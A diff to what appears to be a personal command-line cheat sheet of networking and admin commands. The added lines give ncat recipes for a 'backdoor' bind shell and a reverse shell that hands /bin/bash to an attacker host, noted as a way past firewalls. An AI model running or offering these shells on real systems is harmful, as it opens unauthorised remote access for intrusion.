@@ -156,6 +156,17 @@ tcpdump -S "host web.eecs.umich.edu and port 80 and (tcp[tcpflags] & (tcp-syn|tc
 iftop                              # display bandwidth usage
 python -m SimpleHTTPServer 8000    # start a file server at ./ on port 8000
 
+# Backdoor shell using netcat
+# Note: this version of netcat (ncat) ships with nmap
+TARGET_HOST $ ncat -lvp 8080 -e /bin/bash --ssl
+ATTACK_HOST $ ncat TARGET_HOST 8080 --ssl
+
+# Backdoor reverse shell using netcat
+# This works when the firewall prevents incoming connections
+# Note: this version of netcat (ncat) ships with nmap
+ATTACK_HOST $ ncat -l -p 8080 -vv --ssl
+TARGET_HOST $ ncat -e /bin/bash ATTACK_HOST 8080 --ssl
+
 # Email
 sendmail user@example.com  < email.txt  # send email from CLI
 sendmail -t < email.txt                 # read "TO" field from file
